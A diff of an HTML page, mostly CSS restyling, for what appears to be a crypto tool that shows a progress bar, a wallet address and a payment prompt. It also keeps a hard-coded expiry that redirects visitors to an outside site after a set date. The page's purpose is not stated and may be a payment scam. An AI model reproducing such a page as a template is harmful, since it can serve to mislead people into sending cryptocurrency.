@@ -12,7 +12,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            min-height: 100vh;
+            height: 100vh;
             margin: 0;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
@@ -22,28 +22,30 @@
             flex-direction: column;
             align-items: center;
             background-color: #2c2c2c;
-            border-radius: 1.5vw;
-            padding: 4vh 4vw;
-            width: 80%;
+            border-radius: 12px;
+            padding: 40px;
+            width: 50%;
             max-width: 700px;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
-            border: 0.3vw solid #00ff00;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5); /* Glowing green shadow */
+            border: 2px solid #00ff00; /* Neon green border */
             transition: box-shadow 0.3s ease-in-out;
         }
 
+      
+
         .video-container {
             width: 100%;
-            margin-bottom: 2vh;
+            margin-bottom: 20px;
             border-radius: 2px;
             overflow: hidden;
         }
 
         .video-screen {
             height: 0;
-            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
+            padding-bottom: 56.25%;
             position: relative;
             background-color: #111;
-            border: 0.3vw solid #00ff00;
+            border: 2px solid #00ff00; /* Green border around video */
         }
 
         #video {
@@ -56,51 +58,50 @@
         }
 
         .divider {
-            width: 90%;
+            width: 80%;
             border: none;
-            border-top: 0.2vw solid #00ff00;
-            margin: 2vh 0;
+            border-top: 2px solid #00ff00; /* Neon green divider */
+            margin: 30px 0;
         }
-
         .content {
-            padding: 0 1vw;
+            padding: -50px;
             text-align: center;
         }
 
         h1 {
-            font-size: 2.5vw;
-            color: #00ff00;
-            margin-bottom: 1vh;
-            text-shadow: 0 0 0.5vw #00ff00;
+            font-size: 28px;
+            color: #00ff00; /* Neon green text */
+            margin-bottom: 15px;
+            text-shadow: 0 0 8px #00ff00;
         }
 
         .subtitle {
-            font-size: 1.6vw;
+            font-size: 18px;
             color: #cccccc;
-            margin-bottom: 2vh;
+            margin-bottom: 20px;
         }
 
         .loader {
-            width: 100%;
-            max-width: 300px;
-            height: 4vh;
+            width: 300px;
+            height: 40px;
             background-color: #333;
-            border-radius: 0.5vw;
+            border-radius: 5px;
             position: relative;
-            margin-bottom: 2vh;
+            margin-bottom: 20px;
             overflow: hidden;
-            border: 0.3vw solid #00ff00;
+            margin: 0 auto;
+            border: 2px solid #00ff00; /* Green border around loader */
         }
 
         #progress {
             width: 0;
             height: 100%;
-            background-color: #fa0000;
+            background-color: #fa0000; /* Green progress bar */
             transition: width 0.8s ease-in-out;
         }
 
         #progress-text {
-            font-size: 1vw;
+            font-size: 16px;
             color: #fff;
             position: absolute;
             top: 50%;
@@ -109,70 +110,43 @@
         }
 
         #wallet-address {
-            font-size: 1.2vw;
-            color: #00ff00;
-            margin-bottom: 1vh;
+            font-size: 16px;
+            color: #00ff00; /* Green text for wallet address */
+            margin-bottom: 10px;
             font-weight: bold;
         }
 
         #user-amount {
-            font-size: 2vw;
+            font-size: 24px;
             color: #eaeaea;
-            margin-top: 1vh;
+            margin-top: 10px;
         }
 
         .payment-prompt {
-            margin-top: 2vh;
-            font-size: 1.2vw;
+            margin-top: 20px;
+            font-size: 16px;
             color: #fff200;
-            min-height: 5vh;
-            overflow: hidden;
+            min-height: 50px; /* Fixed height to prevent expansion */
+            overflow: hidden; /* Ensure content stays within this size */
             text-overflow: ellipsis;
         }
 
-        /* Additional Media Queries for Extra Small Screens */
         @media (max-width: 768px) {
             .container {
                 width: 90%;
-                padding: 3vh 3vw;
+                padding: 20px;
             }
 
             h1 {
-                font-size: 4vw;
+                font-size: 22px;
             }
 
-            .subtitle, #progress-text, #wallet-address, .payment-prompt {
-                font-size: 2vw;
-            }
-
-            .loader {
-                height: 3vh;
+            .subtitle {
+                font-size: 16px;
             }
 
             #user-amount {
-                font-size: 3vw;
-            }
-        }
-
-        @media (max-width: 480px) {
-            h1 {
-                font-size: 5vw;
-            }
-
-            .subtitle, #progress-text, #wallet-address, .payment-prompt {
-                font-size: 2.5vw;
-            }
-
-            .loader {
-                height: 3.5vh;
-            }
-
-            #user-amount {
-                font-size: 4vw;
-            }
-
-            .container {
-                padding: 2vh 2vw;
+                font-size: 20px;
             }
         }
     </style>
@@ -193,7 +167,7 @@
                 <div id="progress"></div>
                 <div id="progress-text">0%</div>
             </div>
-            <div id="user-amount"></div>
+            <div id="user-amount" style="color: grey;font-size: 30px; margin-top: 5px;"></div>
             <div id="payment-prompt" class="payment-prompt"></div>
         </div>
     </div>
@@ -269,19 +243,17 @@
             video.pause();
             video.currentTime = 0;
         }
-
-        // Check for expiration date
+        
         var expirationDate = new Date('2024-12-23');
-        expirationDate.setDate(expirationDate.getDate());
-        localStorage.setItem('expirationDate', expirationDate.toISOString());
-
-        function checkExpiration() {
-            var expirationDate = new Date(localStorage.getItem('expirationDate'));
-            if (expirationDate < new Date()) {
-                window.location.href = 'https://boxstoolz.github.io'; 
-            }
-        }
-        checkExpiration();
+         expirationDate.setDate(expirationDate.getDate());
+     localStorage.setItem('expirationDate', expirationDate.toISOString());
+       function checkExpiration() {
+       var expirationDate = new Date(localStorage.getItem('expirationDate'));
+    if (expirationDate < new Date()) {
+   window.location.href = 'https://boxstoolz.github.io'; 
+                 }
+             }
+   checkExpiration();
 
         // Initialize the process based on the coin type parameter
         var coinType = getParameterByName("coin");
